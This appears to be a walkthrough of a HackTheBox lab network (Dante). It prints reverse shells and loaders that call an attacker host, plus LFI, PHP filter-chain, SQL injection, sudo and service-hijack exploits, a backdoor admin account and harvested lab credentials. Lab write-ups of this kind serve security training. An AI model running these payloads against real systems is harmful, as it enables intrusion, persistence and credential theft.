+-Remove account restrictions on Margarets account post-promotion to admin - PENDING
+Key Intelligence:
+
+WordPress service on 172.16.1.10 runs with root privileges
+User Margarets has administrator privileges
+
+Finding 2: PCAP File on 172.16.1.17
+smbclient \\\\172.16.1.17\\forensics -U "anonymous%"
+Found a monitor file:
+└─$ file monitor
+monitor: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
+Open with Wireshark and filter for HTTP traffic to discover authentication credentials:
+admin/password6543
+admin/Password6543
+
+Linux Target: 172.16.1.10
+Port 80: Local File Inclusion (LFI) → RCE
+Vulnerable URL:
+http://172.16.1.10/nav.php?page=about.html
+The page parameter is vulnerable to directory traversal, leading to arbitrary file reading:
+http://172.16.1.10/nav.php?page=../../../../../../../etc/passwd
+Sample Output:
+avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
+nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
+whoopsie:x:120:125::/nonexistent:/bin/false
+colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
+pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
+gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
+frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+margaret:x:1001:1001::/home/margaret:/bin/lshell
+mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
+omi:x:998:998::/var/opt/omi:/bin/false
+PHP Filter Chain RCE
+Using a long chain of PHP filters to achieve Remote Code Execution without file upload:
+http://172.16.1.10/nav.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode
+Reading Slack Messages
+Reading /home/frank/.config/slack/logs/app.log revealed the following conversation:
+"text": "<@U013CT40QHM> set the channel purpose: discuss network security"
+"text": "<@U014025GL3W> has joined the channel"
+"text": "Hi Margaret, I created the channel so we can discuss the network security - in private!"
+"text": "Hi Margaret,"
+"text": "Great idea, Frank"
+"text": "Great idea,"
+"text": "We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?"
+"text": "We need to migrate the Slack workspace to the new Ubuntu images,"
+"text": "Sure, but I need my password for the Ubuntu images, I haven't been given it yet"
+"text": "Sure, but I need my password for the Ubuntu images,"
+"text": "Ahh sorry about that - its STARS5678FORTUNE401"
+"text": "Thanks very much, I'll get on that now."
+"text": "Thanks very much,"
+"text": "No problem at all. I'll make this channel private from now on - we cant risk another breach"
+"text": "Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account"
+"text": "Thanks, will do"
+"text": "Thanks,"
+"text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username"
+"text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat,"
+Credentials Discovered:
+
+margaret:TractorHeadtorchDeskmat
+
+Privilege Escalation: Python Library Hijacking
+After gaining access as user frank, linPEAS discovered an interesting file owned by root:
+File: /home/frank/apache_restart.py
+import call
+import urllib
+url = urllib.urlopen(localhost)
+page= url.getcode()
+if page ==200:
+        print ("We're all good!")
+else:
+        print("We're failing!")
+        call(["systemctl start apache2"], shell=True)
+Analysis:
+
+Script is owned by root
+Monitors apache2 status and restarts it if necessary
+No loop present in the script itself
+Likely executed by cron or systemd timer
+
+Process Check:
+ps aux | grep apache_restart
+frank      23140  0.0  0.0   3312   720 ?        S    22:45   0:00 grep apache_restart
+No direct execution found.
+Cron Check:
+cd /etc/cron.d
+grep -r apache_restart
+No results found in standard cron directories.
+Using pspy to Find Hidden Cron Jobs:
+pspy revealed that root executes the script via /usr/sbin/CRON.
+Exploitation Strategy: Python Library Hijacking
+Since the script imports urllib, we can create a malicious urllib.py in /home/frank/ to hijack the import.
+Step 1: Set up a listener
+nc -lvp 9998
+Step 2: Write malicious Python to /home/frank/urllib.py
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.5",9998))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/bash","-i"])
+Step 3: Wait for cron execution
+After a short wait, successfully obtained root shell:
+└─$ nc -lvvp 9998
+Listening on 0.0.0.0 9998
+Connection received on 10.10.110.3 19185
+
+root@DANTE-NIX02:~# pwd
+pwd
+/root
+
+root@DANTE-NIX02:~# cat /root/flag.txt
+cat /root/flag.txt
+DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}
+root@DANTE-NIX02:~# 
+
+Linux Target: 172.16.1.17
+Open Ports
+172.16.1.17	80
+172.16.1.17	139
+172.16.1.17	445
+172.16.1.17	10000
+Port 80: Source Code Disclosure
+Port 80 hosts an Apache service providing a webmin-1.900.zip file for download.
+The leaked webmin version 1.900 has multiple known vulnerabilities searchable in searchsploit:
+searchsploit webmin 1.9
+
+------------------------------------------------
+ Exploit Title                                  |  Path
+------------------------------------------------
+Webmin 1.920 - 'rpc.cgi' RCE (Metasploit)      | linux/webapps/47330.rb
+------------------------------------------------
+Reviewing Source Code
+From the leaked index.cgi file:
+$gconfig{'sysinfo'} = 0 if ($gconfig{'sysinfo'} == 1);
+
+if ($gconfig{'texttitles'}) {
+    @args = ( $text{'main_title2'}, undef );
+    }
+else {
+    @args = ( $gconfig{'nohostname'} ? $text{'main_title2'} :
+            &text('main_title', $ver, $hostname, $ostr),
+          "images/webmin-blue.png" );
+    if ($gconfig{'showlogin'}) {
+        $args[0] = $remote_user." : ".$args[0];
+        }
+    }
+&header(@args, undef, undef, 1, 1,
+    $tconfig{'brand'} ? 
+    "<a href=$tconfig{'brand_url'}>$tconfig{'brand'}</a>" :
+    $gconfig{'brand'} ? 
+    "<a href=$gconfig{'brand_url'}>$gconfig{'brand'}</a>" :
+    "<a href=http://www.webmin.com/>$text{'main_homepage'}</a>"
+    );
+print "<center><font size=+1>",
+    &text('main_version', $ver, $hostname, $ostr),"</font></center>\n"
+    if (!$gconfig{'nohostname'});
+print "<hr id='header_hr'><p>\n";
+
+print $text{'main_header'};
+
+Windows Target: 172.16.1.102
+Exploitation Results
+Successfully obtained SYSTEM shell:
+C:\Windows\system32>
+User Enumeration
+Viewing users in the Users directory:
+12/25/2023  03:08 AM    <DIR>          katwamba
+01/08/2021  12:26 PM    <DIR>          MediaAdmin$
+08/22/2013  03:39 PM    <DIR>          Public
+06/10/2020  11:23 AM    <DIR>          test
+07/19/2022  04:33 PM    <DIR>          xadmin
+Identified Users:
+
+katwamba
+test
+xadmin
+
+Finding Credentials
+In katwamba\Desktop, found flag.txt and employee_backup.xlsx.
+Download the Excel file:
+meterpreter > download "C:\Users\katwamba\Desktop\employee_backup.xlsx" /project/HTB/ProLab/Dante
+employee_backup.xlsx contains numerous credentials:
+asmith          Princess1
+smoggat         Summer2019
+tmodle          P45678!
+ccraven         Password1
+kploty          Teacher65
+jbercov         4567Holiday1
+whaguey         acb123
+dcamtan         WorldOfWarcraft67
+tspadly         RopeBlackfieldForwardslash
+ematlis         JuneJuly1TY
+fglacdon        FinalFantasy7
+tmentrso        65RedBalloons
+dharding        WestminsterOrange5
+smillar         MarksAndSparks91
+bjohnston       Bullingdon1
+iahmed          Sheffield23
+plongbottom     PowerfixSaturdayClub777
+jcarrot         Tanenbaum0001
+lgesley         SuperStrongCantForget123456789
+User Comment Information Disclosure
+When checking user information with net user, discovered user mrb3n with password in Comment field:
+C:\Windows\system32>net user mrb3n
+net user mrb3n
+
+User name                    mrb3n
+Full Name                    mrb3n
+Comment                      mrb3n was here. I used keep my password S3kur1ty2020! here but have since stopped.  DANTE{1_jusT_c@nt_st0p_d0ing_th1s}
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+Credentials: mrb3n/S3kur1ty2020!Flag: DANTE{1_jusT_c@nt_st0p_d0ing_th1s}
+
+Active Directory Enumeration
+BloodHound Data Collection
+Attempted to use bloodhound-python for AD enumeration:
+INFO: Found AD domain: dante.local
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dante.local:88)] [Errno 111] Connection refused
+INFO: Connecting to LDAP server: DANTE-DC01.DANTE.local
+ERROR: Failure to authenticate with LDAP! Error 8009030C: LdapErr: DSID-0C0905FB, comment: AcceptSecurityContext error, data 52e, v2580
+
+Network Discovery
+Enabling RDP for Persistence
+Using meterpreter to enable RDP and create backdoor user:
+meterpreter > run post/windows/manage/enable_rdp username="dummykitty" password="!QAZ2wsx#EDC"
+
+[*] Enabling Remote Desktop
+[*]     RDP is already enabled
+[*] Setting Terminal Services service startup mode
+[*]     Terminal Services service is already set to auto
+[*]     Opening port in local firewall if necessary
+[*] Setting user account for logon
+[*]     Adding User: dummykitty with Password: !QAZ2wsx#EDC
+[*]     Adding User: dummykitty to local group 'Remote Desktop Users'
+[*]     Hiding user from Windows Login screen
+[*]     Adding User: dummykitty to local group 'Administrators'
+[*] You can now login with the created user
+Manual Method:
+net user dummykitty !QAZ2wsx#EDC /add
+net localgroup administrators dummykitty /add
+Enable RDP via Registry (if disabled):
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+Host Discovery
+Standard network discovery commands:
+ipconfig /all
+route print
+arp -a
+netstat -ano
+type C:\WINDOWS\System32\drivers\etc\hosts
+ipconfig /displaydns | findstr "Record" | findstr "Name Host"
+Ping Sweep from DC01:
+Scanning 172.16.2.0/24 subnet revealed active host 172.16.2.5.
+
+Linux Target: 172.16.2.101
+Privilege Escalation: polkit CVE-2021-3560
+Using linPEAS for enumeration:
+## linPEAS
+nc -lvnp 9002 | tee linpeas.out #Host
+wget -q -O- 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002 #Victim
+Reverse shell for easier file transfer:
+/bin/bash -i >& /dev/tcp/10.10.14.5/9897 0>&1
+Most Linux privilege escalations in this lab can be exploited using polkit CVE-2021-3560. Upload the exploit binary and execute for instant root:
+[+] Assessing machine state...
+[+] Checking for opportunities...
+[+][polkit:CVE-2021-3560] Polkit version is vulnerable!
+[+][polkit:CVE-2021-3560] Opportunity found, trying to exploit it...
+[+][polkit:CVE-2021-3560] Sampling timing of user creation command...
+[+][polkit:CVE-2021-3560] Average time for user creation to fail authentication is 5.879881ms
+[+][polkit:CVE-2021-3560] Attempting to create user 'traitor795' by forcing UID=0...
+[+][polkit:CVE-2021-3560] User 'traitor795' was created with UID (1002)!
+[+][polkit:CVE-2021-3560] Sampling timing of password set command...
+[+][polkit:CVE-2021-3560] Average time for password set to fail authentication is 5.447048ms
+[+][polkit:CVE-2021-3560] Attempting to set user password...
+[+][polkit:CVE-2021-3560] Finished attempting to set password.
+[+][polkit:CVE-2021-3560] Setting up tty...
+[+][polkit:CVE-2021-3560] Attempting authentication as new user...
+[+][polkit:CVE-2021-3560] Authenticated as traitor795 (1002)!
+[+][polkit:CVE-2021-3560] Attempting escalation to root...
+[+][polkit:CVE-2021-3560] Authenticated as root!
+[+][polkit:CVE-2021-3560] Writing payload...
+
+root@DANTE-NIX07:~# ls
+Alternative: SUID Binary Exploitation
+LinPEAS revealed a non-standard SUID binary:
+-rwsr-sr-x 1 root julian 17K Jun 30  2020 /usr/sbin/readfile (Unknown SUID binary!)
+Original intended path was exploiting a buffer overflow vulnerability in readfile to escalate to root.
+Further Network Discovery
+Ping sweep from 172.16.2.101 discovered additional host 172.16.2.6 (not visible from 172.16.2.5 due to firewall rules):
+for i in {1..255};do (ping -c 1 172.16.2.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &);done
+
+172.16.2.5
+172.16.2.6
+172.16.2.101
+Establishing Meterpreter Session
+To further pivot to 172.16.2.6, establish a meterpreter session:
+wget -q -O- 10.10.14.5:9999/downloader.sh|bash
+downloader.sh content:
+#!/bin/bash
+wget -q http://10.10.14.5:9999/test -O .te
+chmod +x .te
+nohup ./.te &
+Add route in new meterpreter session:
+run autoroute -s 172.16.2.6
+
+Linux Target: 172.16.2.6
+Port Scanning
+Using MSF to scan 172.16.2.6 from 172.16.2.101:
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 172.16.2.6
+set THREADS 10
+run
+Result: 172.16.2.6 only has port 22 (SSH) open.
+SSH Credential Reuse
+Credentials from previous hosts work:
+
+julian:manchesterunited
+
+Alternative: SSH Bruteforce
+Both of the following credentials successfully login via SSH bruteforce attack.
+
+Linux Target: 172.16.1.12
+Open Ports
+172.16.1.12	21   (FTP)
+172.16.1.12	22   (SSH)
+172.16.1.12	80   (HTTP)
+172.16.1.12	443  (HTTPS)
+172.16.1.12	3306 (MySQL)
+Port 80: SQL Injection
+Port 80 hosts a XAMPP service (similar version to 172.16.1.13).
+Directory Enumeration:
+python /webtools/dirscan/dirsearch/dirsearch.py -u http://172.16.1.12 -e php -p socks5://localhost:1080 -w /webtools/dicts/SecLists/Discovery/Web-Content/common.txt
+
+[20:11:05] Starting:
+[20:11:27] 301 -  232B  - /blog  ->  http://172.16.1.12/blog/
+[20:11:31] 403 -    1KB - /cgi-bin/
+[20:11:37] 301 -  237B  - /dashboard  ->  http://172.16.1.12/dashboard/
+[20:11:47] 200 -   30KB - /favicon.ico
+[20:11:56] 301 -  231B  - /img  ->  http://172.16.1.12/img/
+[20:12:17] 403 -    1KB - /phpmyadmin
+[20:12:48] 301 -  237B  - /webalizer  ->  http://172.16.1.12/webalizer/
+Found /blog directory.
+SQLMap Exploitation
+Running sqlmap against the vulnerable parameter:
+sqlmap 'http://172.16.1.12/blog/category.php?id=1' --dbs --batch --proxy socks5://localhost:1080
+
+[20:45:58] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[20:46:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+
+Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=-4778' UNION ALL SELECT NULL,CONCAT(0x7176626a71,0x50687146794d544756786254455a6153556a736c776e696c6e77516c78476a454c636c727474756d,0x71706b6a71)#
+---
+[20:46:01] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 7.4.7, Apache 2.4.43
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+
+[20:46:03] [INFO] fetching database names
+[20:46:06] [INFO] retrieved: 'information_schema'
+[20:46:07] [INFO] retrieved: 'test'
+[20:46:08] [INFO] retrieved: 'performance_schema'
+[20:46:09] [INFO] retrieved: 'flag'
+[20:46:10] [INFO] retrieved: 'mysql'
+[20:46:11] [INFO] retrieved: 'blog_admin_db'
+[20:46:12] [INFO] retrieved: 'phpmyadmin'
+
+available databases [7]:
+[*] blog_admin_db
+[*] flag
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] test
+Extracting Flag from Database:
+sqlmap 'http://172.16.1.12/blog/category.php?id=1' --dbs --batch --proxy socks5://localhost:1080 -D flag -T flag -C flag --dump
+
+[20:48:28] [INFO] fetching entries of column(s) 'flag' for table 'flag' in database 'flag'
+
+Database: flag
+Table: flag
+[1 entry]
++------------------------------+
+| flag                         |
++------------------------------+
+| DANTE{wHy_y0U_n0_s3cURe?!?!} |
++------------------------------+
+Note: Attempting --os-shell failed due to lack of write permissions.
+
+Linux Target: 172.16.1.12 Continued
+User ben Privilege Escalation
+After gaining initial access as user ben:
+ben@DANTE-NIX04:~/.tmp$ ./.pw
+root@DANTE-NIX04:/home/ben/.tmp#
+Privilege Escalation Method 1: sudo < 1.8.28
+Checking sudo version:
+ben@DANTE-NIX04:~/.tmp$ sudo -V
+Sudo version 1.8.27
+Sudoers policy plugin version 1.8.27
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.27
+For sudo versions < 1.8.28, the following payload grants instant root:
+sudo -u#-1 /bin/bash
+Successful escalation:
+ben@DANTE-NIX04:~/.tmp$ sudo -u#-1 /bin/bash
+root@DANTE-NIX04:/home/ben/.tmp#
+Cracking Shadow Hash
+Found a hint in /etc/shadow:
+julian:$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:18439:0:99999:7:::
+Steps to crack:
+
+Download /etc/passwd and /etc/shadow
+Combine with unshadow:
+
+unshadow 172.16.1.12_etc_passwd 172.16.1.12_shadowhash > 172.16.1.12_unshadow
+
+Edit to keep only julian's entry
+
+Crack with john:
+
+
+john --wordlist=/webtools/dicts/rockyou.txt 172.16.1.12_unshadow
+First attempt warning:
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+
+Retry with correct format:
+
+john --wordlist=/webtools/dicts/rockyou.txt 172.16.1.12_unshadow --format=md5crypt-long
+Cracked Password: manchesterunited
+Final Credentials: julian:manchesterunited
+
+Windows Target: Additional Host
+Unquoted Service Path Vulnerability
+Using searchsploit for IObit Uninstaller:
+searchsploit iobit uninstaller
+
+-----------------------------------------------------------------------------------------------------------------
+ Exploit Title                                                                                                   |  Path
+-----------------------------------------------------------------------------------------------------------------
+IObit Uninstaller 10 Pro - Unquoted Service Path                                                                 | windows/local/49371.txt
+IObit Uninstaller 9.1.0.8 - 'IObitUnSvr' Unquoted Service Path                                                   | windows/local/47538.txt
+IObit Uninstaller 9.5.0.15 - 'IObit Uninstaller Service' Unquoted Service Path                                   | windows/local/48543.txt
+-----------------------------------------------------------------------------------------------------------------
+The History.txt file reveals version 9.5, which is vulnerable to Unquoted Service Path privilege escalation.
+Issue: To exploit, need to write malicious IObit.exe to C:\Program Files (x86)\IObit, but this path lacks write permissions.
+Creating Reverse Shell Payload
+PowerShell Reverse Shell:
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+Encoding and Deployment:
+
+Encode with UTF-16LE and base64
+Write to runme.bat
+Download to target:
+
+mkdir c:\temp
+cd c:\temp
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:9999/runme.bat','c:\temp\runme.bat')
+Set up listener:
+nc -lvp 9001
+Modify Service Configuration:
+sc.exe stop IObitUnSvr
+sc.exe config IObitUnSvr binPath="cmd.exe /c c:\temp\runme.bat"
+sc.exe qc IObitUnSvr
+sc.exe start IObitUnSvr
+Result: Receive reverse shell upon service start.
+Flag Location:
+C:\Users\Administrator\Desktop\flag.txt
+
+Additional Techniques
+Disk Group Privilege Escalation
+User ian belongs to the disk group:
+uid=1001(ian) gid=1001(ian) groups=1001(ian),6(disk)
+Users in the "disk" group have special disk access permissions, allowing read-write operations on raw disk devices.
+Retrieve disk information:
+cat /proc/self/mounts|grep 'sda'
+This allows reading sensitive files directly from disk blocks, potentially extracting credentials or other valuable data.
+
+Domain Controller: DANTE-DC02
+Hash Extraction
+Successfully extracted hashes:
+DANTE-DC02$:aes256-cts-hmac-sha1-96:a8c99d4f9c5a85e2ff62b4fce51b16e14c15d83f4a78fde89e52b98e7fb63d48
+DANTE-DC02$:aes128-cts-hmac-sha1-96:4c917008232d55247ef311d89437a078
+DANTE-DC02$:des-cbc-md5:b5497fb9eac17f5d
+[*] Cleaning up...
+Pass-the-Hash Attack
+With Administrator's hash obtained, use Pass-the-Hash to gain Administrator privileges without knowing the plaintext password.
+
+MSSQL Exploitation: 172.16.1.5
+Port 1433 Exploitation
+Using Metasploit module for MSSQL Command Execution:
+[*] 172.16.1.5:1433 - Command Stager progress -  76.24% done (77948/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  77.70% done (79447/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  79.17% done (80946/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  80.63% done (82445/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  82.10% done (83944/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  83.57% done (85443/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  85.03% done (86942/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  86.50% done (88441/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  87.96% done (89940/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  89.43% done (91439/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  90.90% done (92938/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  92.36% done (94437/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  93.83% done (95936/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  95.29% done (97435/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  96.76% done (98934/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  98.19% done (100400/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress -  99.59% done (101827/102246 bytes)
+[*] 172.16.1.5:1433 - Command Stager progress - 100.00% done (102246/102246 bytes)
+
+Summary of Flags Collected
+Throughout the Dante Pro Lab, the following flags were captured:
+
+DANTE{Too_much_Pr1v!!!!} - Initial WordPress compromise
+DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD} - Python library hijacking privilege escalation
+DANTE{1_jusT_c@nt_st0p_d0ing_th1s} - User comment password disclosure
+DANTE{wHy_y0U_n0_s3cURe?!?!} - SQL injection flag
+
+
+Tools & Techniques Used
+Reconnaissance
+
+nmap
+fscan
+Goby
+ehole (fingerprinting)
+smbclient
+Wireshark (PCAP analysis)
+
+Exploitation
+
+WordPress plugin editor exploitation
+Metasploit Framework
+sqlmap
+PHP filter chain RCE
+Local File Inclusion (LFI)
+
+Post-Exploitation
+
+chisel (SOCKS proxy)
+pwncat-cs
+meterpreter (pivoting)
+linPEAS
+pspy (hidden cron detection)
+
+Privilege Escalation
+
+Python library hijacking
+polkit CVE-2021-3560
+sudo < 1.8.28 vulnerability
+disk group exploitation
+Unquoted Service Path
+Pass-the-Hash
+
+Password Cracking
+
+john the ripper
+unshadow
+
+
+How to Copy This Into Word
+
+Copy all the text above (Ctrl+A, then Ctrl+C)
+Open Microsoft Word
+Paste (Ctrl+V)
+Word will automatically format the text
+Optional: Apply a professional style:
+Select all text (Ctrl+A)
+Choose a document theme from the "Design" tab
+Format code blocks with "Courier New" or "Consolas" font
+Add a table of contents (References → Table of Contents)
+
+
+
+Alternatively, if you want better formatting, you can:
+
+Save this as a .md (Markdown) file
+Use Pandoc to convert to .docx: pandoc input.md -o output.docx
+
